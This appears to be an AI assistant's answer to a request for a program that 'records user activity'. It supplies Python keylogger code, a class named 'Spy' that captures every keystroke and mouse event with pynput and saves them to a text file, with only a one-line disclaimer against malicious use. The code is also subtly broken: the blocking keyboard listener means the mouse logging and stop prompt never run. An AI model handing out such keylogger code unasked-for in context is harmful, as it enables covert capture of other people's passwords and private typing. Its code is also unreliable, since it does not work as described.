I can provide a basic example of a program that can record user activity. This example will be in Python, using the `pynput` and `pyautogui` libraries. Note that this is a basic example and should not be used for malicious purposes.

**Note:** Before running this program, you need to install the required libraries by running `pip install pynput pyautogui`.

```python
import pyautogui
from pynput import keyboard, mouse

class Spy:
    def __init__(self):
        self.activity_log = []
        self.mouse_activity_log = []

    def on_press(self, key):
        try:
            self.activity_log.append(f"Key pressed: {key.char}")
        except AttributeError:
            self.activity_log.append(f"Key pressed: {key}")

    def on_release(self, key):
        try:
            self.activity_log.append(f"Key released: {key.char}")
        except AttributeError:
            self.activity_log.append(f"Key released: {key}")

    def on_move(self, x, y):
        self.mouse_activity_log.append(f"Mouse moved to ({x}, {y})")

    def on_click(self, x, y, button, pressed):
        self.mouse_activity_log.append(f"Mouse {button} {pressed} at ({x}, {y})")

    def on_scroll(self, x, y, dx, dy):
        self.mouse_activity_log.append(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})")

    def start_spy(self):
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        listener.join()

        mouse_listener = mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)
        mouse_listener.start()
        mouse_listener.join()

    def record_activity(self):
        return self.activity_log, self.mouse_activity_log

spy = Spy()
spy.start_spy()

# Wait for user to stop the program
input("Press enter to stop the spy")

spy.activity_log, spy.mouse_activity_log

# Save the logs to a file
with open("activity_log.txt", "w") as f:
    for item in spy.activity_log:
        f.write(f"{item}\n")

    for item in spy.mouse_activity_log:
        f.write(f"{item}\n")
